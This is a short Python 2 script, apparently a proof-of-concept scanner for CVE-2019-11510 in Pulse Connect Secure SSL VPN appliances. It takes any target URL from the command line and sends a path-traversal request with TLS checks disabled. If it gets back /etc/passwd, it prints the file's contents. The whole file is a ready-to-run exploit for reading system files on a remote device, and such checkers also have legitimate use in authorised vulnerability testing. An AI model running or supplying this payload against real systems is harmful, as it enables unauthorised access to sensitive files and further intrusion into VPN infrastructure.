# -*- coding:utf-8 -*-
# !/usr/bin/env python

import sys
import urlparse
import requests
import warnings
import traceback

reload(sys)
sys.setdefaultencoding('utf-8')
requests.packages.urllib3.disable_warnings()
warnings.filterwarnings("ignore")

def CVE_2019_11510(base_url):
    try:
        payloads, keywords = "/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/", "root:x"
        r = requests.get(base_url + payloads, verify=False)
        r.close()
        if keywords in r.text:
            print "[✓] Found CVE-2019-11510 Vuln address(curl --path-as-is -s -k <target>):\n{}\n{}".format(
                base_url + payloads, r.content)
        else:
            print "[x] Not Found Vuln!"
    except requests.exceptions.ConnectionError:
        pass
    except requests.ReadTimeout:
        pass
    except:
        traceback.print_exc()

if __name__ == '__main__':
    if len(sys.argv) == 1:
        print '[+] Tip: python Pcs_Ssl_Vpn_CVE_2019_11510@Coco413.py <url>'
        sys.exit(0)
    url = sys.argv[1]
    CVE_2019_11510(urlparse.urlparse(url).scheme + "://" + urlparse.urlparse(url).hostname)
